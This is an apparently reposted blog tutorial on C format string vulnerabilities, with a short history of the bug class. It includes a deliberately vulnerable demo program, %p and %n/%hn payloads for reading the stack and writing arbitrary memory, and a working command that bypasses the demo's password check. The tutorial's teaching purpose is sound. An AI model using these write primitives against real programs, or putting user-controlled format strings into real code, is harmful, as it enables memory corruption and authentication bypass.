原文 by [gbmaster](https://gbmaster.wordpress.com)  

C/C++ (but also other languages) make a huge use of format functions: let’s think to all the times that we use them to print messages or when we need to write data formatted into a specific way inside a string. I’m talking, of course, about printf, fprintf, sprintf, etc.  

The principle behind all these functions is to evaluate the format string specified (y’know… all this “%s %d %X” stuff) and, at the same time, access the additional parameters specified to correctly substitute all the specifiers with the correct data. What could possibly go wrong with a printf? Well, what if we let the user specify the format string itself? What if, instead of the correct usage  
`printf("%s", str);`  
this other one  
 `printf(str);`  
is used?  

Well, sure, they both print the str parameter to screen, unless… Unless str itself contains specifiers… But even if it did, we didn’t provide anyway any additional parameter: so what’s it going to print to screen? In order to answer this question, we need to understand how printf internally works.  

Just to be different, stack is involved, as format functions retrieve these parameters from there. For example, when this printf is called  

 `printf("%s is %d years old.\n", name, age);`  
the stack will look like this:  
```
 STACK:   ^
         |
         |      value of age
         |      value of name (as it's a pointer, it's an address)
         |      address of the format string
         |
```
Inside the printf the format string is parsed and, when a “%” is met, the data is retrieved from the stack accordingly to the type of parameter specified (well, apart from “%%” which is the escape for “%”). Now it’s possible to answer the previous question: printf is going to read anyway the data from the stack, even if we didn’t provide any.  

This means that, with a proper format string, we can even crash the program itself. We’ll use the following piece of code:  
``` c
 #include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char tmp[256];

  if (argc == 2)
  {
    // Yeah, let's be secure here (sic!)
    strncpy(tmp, argv[1], sizeof(tmp));
    printf(tmp);
  }
  else
  {
    printf("Syntax: %s \n", argv[0]);
  }

  return 0;
}
```
Let’s ask the program to print A LOT of strings:  
```
$ ./fs %s%s%s%s%s%s%s%s  
Segmentation fault
```
Why did this happen? Because printf tried to extract one address for each “%s” specified and tried to read from a memory location which doesn’t exist or whose address space is protected. In both cases, the result is a segfault. Yes, not much of a fun here, huh? But we could also read and dump the stack content with a different format string:  
```
 $ ./fs "%p %p %p %p"
0xff974120 0x100 0xff9735f4 0x8048322$
```
Looking at the previous code and to the previous command line it becomes clear that, with enough specifiers, it is possible to access to the tmp value in the stack.  
```
 $ ./fs "AAAA%p %p %p %p %p %p %p"
AAAA0xffb61119 0x100 0xffb5ff84 0x8048322 0xf74293d0 0xf741feb0 0x41414141$
```
A-ha! The last value actually corresponds to the first four bytes of the format string itself. Mmm, %p printed an arbitrary value. This means that we can print the string representation of whichever memory location just by using the previous format stringm by replacing “AAAA” with the memory location we want to retrieve the data from and the “%p” with a “%s” (as it uses the value retrieved from the stack as a pointer). Well, there could be a lot of specifiers in the format string and having to write them each time is boring. It’s possible to shorten the previous format string into the following:  
```
 $ ./fs 'AAAA%7$p'
AAAA0x41414141$
```
which says more or less “hey, take into account the seven-th argument and parse it as a %p” (Direct Parameter Access).  

So, the only thing missing is how to write arbitrary data to an arbitrary location. But how can this be possible with a printf-like function call? Well, it turns out that format functions have this little specifier “%n” which allows to store the number of characters written so far into the integer pointed by the specified argument. This means that if we slightly modify the previous command into  
```
 $ ./fs 'AAAA%7$n'
Segmentation fault
```
the program tried to write the integer “4” into the location “0x41414141” (it ended with a segfault because this address is not mapped). So, writing these small integers is not a big deal: how can we increase the number written without manually printing a lot of characters? Well, we could use the padding feature of the format strings. This format string  
```
 $ ./fs 'AAAA%150u%7$n'
Segmentation fault
```
tries to write the number 150 into 0x41414141. In fact “%150u” pads an integer with spaces in order to print AT LEAST 150 characters. The problem now is finding a way to print BIG integers (like addresses) by using this technique.  

The first solution that comes into mind is to write a 32-bit address a byte a time, with 4 overwrites. For example, let’s say that we need to write the value 0xDDCCBBAA into the location 0x41414141: the string  
```
 $ ./fs 'AAAABAAACAAADAAA%154u%7$n%17u%8$n%17u%9$n%17u%10$n'
Segmentation fault
```
will do the trick and here’s why. The string “AAAABAAACAAADAAA” is printed and this means that the first writing operation will write the number 0x000000AA in the location 0x41414141, as we printed already 16 characters and we’re adding 154 more: mind the little endian-ness here, as 0xAA is stored at the address 0x41414141 and zeroes as stored between the locations 0x41414142 and 0x41414144. The next writing operation, as you can see, will write the number 0x000000BB starting at the location 0x41414142, as we’re printing 17 more characters (which, added to the previous 170, result in 187 = 0xBB characters), and so on… At the end, the number 0xDDCCBBAA is stored at 0x41414141 and, due to the last writing operation (the one acting on 0x41414144), additional zeroes will be stored between locations 0x41414145 and 0x41414148, overwriting whatever was stored there.  

In the previous scenario, the numbers were always increasing, so we counted on the fact that the number of printed characters was increasing as well and, so, useful for this purpose. What if there’s a byte to be written lower than the previous one, like in 0xDDBBCCAA? Well these bytes operations are always overwriting bytes written by the previous one (0x000000BB was written where the zeroes of 0x000000AA were stored). What’s important is always the least significant byte, as we’re in little endian. This means that, in order to write 0xDDBBCCAA into 0x41414141, it’s sufficient to run the following string:  
```
 $ ./fs 'AAAABAAACAAADAAA%154u%7$n%34u%8$n%239u%9$n%34u%10$n'
Segmentation fault
```
After writing 0x000000CC, we were able to write a 0xBB byte into 0x41414143 by writing up to 443 = 0x1BB characters: the 0x01 byte written at 0x41414144 by this operation will be anyway overwritten by the following writing operation.  

There’s anyway another specifier, analog to %n, that allows to write the number of printed characters ONLY two bytes at a time: “%hn”. This has the advantage of speeding up the process of overwriting an address, as we need only two operations to do this, AND does not overwrite the bytes following the memory location specified. The 0xAABBCCDD example becomes:  
```
 $ ./fs 'CAAAAAAA%43699u%7$hn%8738u%8$hn'
Segmentation fault
```
where the first operation writes 0xAABB to 0x41414143 (mind the little-endian) and the second one writes 0xCCDD to 0x41414141.  

Enough with these segmentation faults: let’s try to exploit this vulnerability with the following (sad) piece of code:  
``` c
 #include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char tmp[256];
  char pwd_ok = 0;

  if (argc == 2)
  {
    strncpy(tmp, argv[1], sizeof(tmp));

    if (!strncmp(tmp, "gb_master", 9))
    {
      pwd_ok = 1;
    }
    else
    {
      char buffer[1024];

      strncpy(buffer, argv[1], sizeof(buffer));
      strcat(buffer, " is not the correct password\n");

      // The vulnerability, of course
      printf(buffer);
    }

    if(pwd_ok != 0)
    {
      printf("Here's a cookie, for you!\n");
    }
  }
  else
  {
    printf("Syntax: %s <password>\n", argv[0]);
  }

  return 0;
}
```
Apart from the obscene authentication process, it’s plain that, here, the key of everything is the pwd_ok variable: if we’re able change its value from zero, then we’ll get the cookie. Through a GDB session, it’s possible to retrieve the address of the pwd_ok variable and, on my PC, it’s 0xFFFFC9F8. As we can write whatever we want in the memory location reserved to that variable, it’s useless to do the math and a very simple format string can trigger the cookie gift:  
```
 $ ./fs "$(python -c 'import sys; sys.stdout.write("\xF8\xC9\xFF\xFF%7$n
���� is not the correct password
Here's a cookie, for you!
```
Format strings can get, anyway, WAY MORE complicated than all the ones that I showed in this article, as they can be used to build the stack for a call and for many other purposes. I chose to not go further with this technique because they’re not too widespread anymore nowadays (at least, not in this form): we’ll be able to get back on this in the future anyway.  

And now, an article of mine wouldn’t be such without some history. The first format string vulnerability was found by Miller, Fredriksen and So during a fuzz test on the csh shell in December 1990, when they published the results of the analysis on the paper “[An Empirical Study of the Reliability of UNIX Utilities] ftp://ftp.cs.wisc.edu/paradyn/technical_papers/fuzz.pdf “. However, this type of vulnerability remained silent for almost ten years. This silence was broken by Tymm Twillman, who discovered a vulnerability inside the ProFTPD daemon code in September 1999 and published his analysis on [Bugtraq](http://seclists.org/bugtraq/1999/Sep/328). This was only the beginning because, not much time later, the attention was focused on WU-FTPD, as [Przemyslaw Frasunek](http://seclists.org/bugtraq/2000/Jun/312) and [tf8](http://seclists.org/bugtraq/2000/Jun/297) started publishing working exploits for similar vulnerabilities.  

Format string attacks definitely gained popularity in these months and it was time to analyse how they worked in a proper way. The paper containing the results is “[Format String Attacks](http://www.thenewsh.com/~newsham/format-string-attacks.pdf)“, published by Timothy Newsham in September 2000.    

In May 2001 Cowan, Barringer, Beattie and Kroah-Hartman proposed a defense from the format string attacks: [FormatGuard](https://www.usenix.org/legacy/events/sec01/full_papers/cowanbarringer/cowanbarringer.pdf). This approach consisted into transforming all these format functions into equivalent macros: each macro would count the number of arguments passed to the function and compare this number to the number of specifiers inside the format string. If these numbers mismatched, then the program would abort. However, this approach was based on static analysis and, so, covered only a small part of the problem.     

At last, a paper describing how to exploit these scenarios was published by scut (member of TESO) in September 2001: “[Exploiting Format String Vulnerabilities](https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf)“. This paper really describes the problem, the possible cases and all the different techniques appliable to each of them.  

In 2002 it was time for “[Advances in format string exploitation](http://www.phrack.org/issues/59/7.html)“, in which gera and riq explained some tricks on how to speed up the format string exploitation and some techniques for heap-based format string attacks. Then, in 2010, Captain Planet’s article “[A Eulogy for Format Strings](http://phrack.org/issues/67/9.html)” appeared on Phrack, explaining how to bypass the mitigation techniques that were implemented in the meanwhile.  